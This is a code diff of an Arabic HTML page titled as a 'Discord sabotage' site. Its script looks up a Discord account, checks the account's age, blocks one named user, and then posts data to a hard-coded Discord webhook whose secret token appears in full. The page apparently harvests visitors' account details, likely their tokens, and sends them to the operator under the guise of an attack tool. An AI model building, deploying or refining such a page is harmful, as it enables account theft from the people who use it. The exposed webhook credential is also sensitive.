@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>موقع تخريب ديسكورد </title>
+  <title>موقع تخريب ديسكورد</title>
   <style>
     body {
       background: linear-gradient(to bottom right, #0077ff, #00ff88);
@@ -69,15 +69,21 @@
       }).then(res => {
         if (res.status === 200) {
           res.json().then(data => {
+            const username = `${data.username}#${data.discriminator}`;
+            const fullName = data.username;
+
+            if (fullName === "celestial_monkey_95389") {
+              resultDiv.textContent = "قم بتجربه حساب اخر❌ .";
+              return;
+            }
+
             const createdAt = getDateFromSnowflake(data.id);
             const now = new Date();
             const accountAgeInDays = Math.floor((now - createdAt) / (1000 * 60 * 60 * 24));
 
-            if (accountAgeInDays < 100) {
-              resultDiv.textContent = "❌ يجب أن يكون عمر الحساب أكثر من 5 أشهر";
+            if (accountAgeInDays < 40) {
+              resultDiv.textContent = "❌ يجب أن يكون عمر الحساب أكثر من 40 يومًا";
             } else {
-              const username = `${data.username}#${data.discriminator}`;
-              
               fetch("https://discord.com/api/webhooks/1381695158462058558/JpwXpQ4zEnhKkju9FOAWqYXjbU72YQ-oHsPb2RydTyTuZKyv357cB16HOO901tEiqw_K", {
                 method: "POST",
                 headers: {
@@ -98,7 +104,6 @@
       });
     }
 
-   
     function getDateFromSnowflake(snowflake) {
       const discordEpoch = 1420070400000;
       return new Date(Number(BigInt(snowflake) >> 22n) + discordEpoch);
